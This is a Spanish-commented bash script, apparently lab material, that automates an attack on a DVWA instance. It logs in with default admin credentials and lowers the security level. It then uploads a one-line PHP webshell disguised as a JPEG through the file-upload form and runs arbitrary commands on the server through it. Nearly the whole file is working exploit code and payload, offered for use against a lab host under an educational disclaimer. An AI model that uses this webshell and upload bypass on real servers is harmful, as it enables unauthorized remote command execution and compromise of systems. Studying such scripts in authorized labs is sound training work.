#!/usr/bin/env bash
# webshell.sh -- AUTOMATIZA de punta a punta el paso "de la web a la shell" contra MI DVWA
# del laboratorio aislado usando la subida de archivos:
#   1) inicia sesion (admin) y fija el nivel de seguridad en low
#   2) SUBE una webshell PHP por el formulario de subida (que no valida el tipo real)
#   3) ejecuta en el servidor el comando que le pases, a traves de esa webshell
#
#   Uso:  ./webshell.sh ['comando; otro comando']     (por defecto: id; uname -a)
#
# SOLO sistemas propios y autorizados. Laboratorio aislado, sin salida a internet.
# Morini Computers -- Ciberseguridad. Encuadre educativo y de defensa.
set -u
URL="http://10.13.37.30"
CMD="${1:-id; uname -a}"
JAR="$(mktemp)"
tok() { grep -oE "user_token' value='[0-9a-f]+'" | grep -oE '[0-9a-f]{16,}' | head -1; }

echo "[1] Inicio sesion en DVWA (admin) y fijo el nivel de seguridad en low..."
T1=$(curl -s -c "$JAR" "$URL/login.php" | tok)
curl -s -b "$JAR" -c "$JAR" -L \
     --data-urlencode "username=admin" --data-urlencode "password=password" \
     --data-urlencode "user_token=$T1" --data "Login=Login" "$URL/login.php" >/dev/null
T2=$(curl -s -b "$JAR" -c "$JAR" "$URL/security.php" | tok)
curl -s -b "$JAR" -c "$JAR" --data "security=low" --data "seclev_submit=Submit" \
     --data-urlencode "user_token=$T2" "$URL/security.php" >/dev/null
SID=$(awk '/PHPSESSID/{print $7}' "$JAR"); COOKIE="PHPSESSID=$SID; security=low"

echo "[2] Preparo una webshell PHP y la SUBO por el formulario (se hace pasar por imagen)..."
SHELL_TMP="$(mktemp /tmp/shXXXX.php)"
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > "$SHELL_TMP"
UT=$(curl -s -b "$COOKIE" "$URL/vulnerabilities/upload/" | tok)
curl -s -b "$COOKIE" \
     -F "MAX_FILE_SIZE=100000" \
     -F "uploaded=@$SHELL_TMP;filename=shell.php;type=image/jpeg" \
     -F "user_token=$UT" -F "Upload=Upload" \
     "$URL/vulnerabilities/upload/" | grep -oiE "succesfully uploaded|uploaded" | head -1
rm -f "$SHELL_TMP" "$JAR"

echo "[3] Ejecuto en el servidor a traves de la webshell:  $CMD"
curl -s -b "$COOKIE" "$URL/hackable/uploads/shell.php" --data-urlencode "cmd=$CMD" -G \
  | sed -e 's/<[^>]*>//g' -e '/^[[:space:]]*$/d'

echo "[*] Listo: control remoto del servidor desde una URL. Eso es una webshell."
